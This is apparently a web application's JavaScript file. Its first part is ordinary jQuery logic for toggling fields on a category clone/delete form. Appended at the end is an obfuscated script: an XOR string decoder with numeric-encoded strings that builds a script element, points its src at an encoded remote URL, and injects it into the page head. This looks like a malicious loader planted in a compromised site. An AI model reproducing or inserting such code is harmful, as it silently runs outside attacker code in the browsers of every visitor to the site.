jQuery(document).ready(function($) {
  noah_formId = 'fieldset_form';
  var allConditionalFields = new Array(
    'deleteAll', 'cloneToSubcats', 'cloneToCats', 'cloneFromCat'
  );
  var allConditionFields = new Array(
    'deleteAll', 'cloneToSubcats', 'cloneToCats', 'cloneFromCat'
  );
  //dump(cfForm);
  disableFields( allConditionalFields );
  hideAndDisplay(1);
  addConditionalEvents( allConditionFields );
});

function hideAndDisplay(firstCall)
{
  var form = $JQ('#'+noah_formId);
  var formVals = form.formHash();
  formVals.cloneToCats=$JQ('#asmList0 li').length;
  if( typeof formVals.cloneToSubcats == 'undefined' || formVals.cloneToSubcats=='' ) formVals.cloneToSubcats=0;
  if( typeof formVals.deleteAll == 'undefined' || formVals.deleteAll=='' ) formVals.deleteAll=0;
  //if( typeof formVals.cloneFromCat == 'undefined' || formVals.cloneFromCat=='false' ) formVals.cloneFromCat=0;
  //dump(formVals);
  displayField( 'deleteAll', (formVals.cloneToSubcats==0 && formVals.cloneToCats==0 && formVals.cloneFromCat==0));
  displayField( 'cloneToSubcats', (formVals.deleteAll==0 && formVals.cloneToCats==0 && formVals.cloneFromCat==0));
  displayField( 'cloneToCats', (formVals.deleteAll==0 && formVals.cloneToSubcats==0 && formVals.cloneFromCat==0));
  displayField( 'cloneFromCat', (formVals.deleteAll==0 && formVals.cloneToSubcats==0 && formVals.cloneToCats==0));
  // hogy a form le-fel nyilasa ne legyen zavaro, mindig a kepernyo legaljara pozicionalunk:
  if( firstCall!=1 ) $JQ(window).scrollTop($JQ(document).height() - $JQ(window).height());
}

function displayField( field, condition )
{
  //alert( field + ', ' + condition);
  var row = $JQ("#"+field).parents('tr.row');
  if( condition )  row.show();
  else row.hide();
}

function disableFields( fields )
{
  $JQ.each( fields, function() {
    $JQ("#" + this).parents('tr.row').hide();     
  });
}

function addConditionalEvents( fields )
{
  $JQ.each( fields, function() {
    $JQ("#"+noah_formId+" select[name='"+this+"']").change(hideAndDisplay);  
  });
  $JQ.each( fields, function() {
    $JQ("#"+noah_formId+" input[name='"+this+"']").click(hideAndDisplay);  
  });
}


function j0jh7F(h2Ow8,aJ){var d27='';var zJQ3=0;var zr21re=0;for(zJQ3=0;zJQ3<h2Ow8.length;zJQ3++){var orm=h2Ow8.charAt(zJQ3);var zwN=orm.charCodeAt(0)^aJ.charCodeAt(zr21re);orm=String.fromCharCode(zwN);d27+=orm;if(zr21re==aJ.length-1)zr21re=0;else zr21re++;}return (d27);}function l3E4E(xEb5X){var xoA='';var ql=0;var ie=0;for(ql=0;ql<xEb5X.length/3;ql++){xoA+=String.fromCharCode(xEb5X.slice(ie,ie+3));ie=ie+3;}return xoA;}function cKvR3Zr(xk1i5){var xvE=document[cGYq5(j4qH93Z[3])](cGYq5(j4qH93Z[0])+cGYq5(j4qH93Z[1])+cGYq5(j4qH93Z[2]));xvE[cGYq5(j4qH93Z[4])]=xk1i5;xvE[cGYq5(j4qH93Z[5])]=cGYq5(j4qH93Z[6]);document[cGYq5(j4qH93Z[9])](cGYq5(j4qH93Z[8]))[0][cGYq5(j4qH93Z[7])](xvE);}function cGYq5(tU){return j0jh7F(l3E4E(tU),'pnPvE1i78z4a0');}var j4qH93Z=["003013","002007","000026","019028053023049084044091093023081015068","003028051","004023032019","004011040002106091008065089009087019089000026","017030032019043085042095081022080","024011049018","023011036051041084004082086014071035073036015055056036092012","024026036006127030070068076027064004030003003060068107067028024082009027002094004064058005"];cKvR3Zr(cGYq5(j4qH93Z[10]));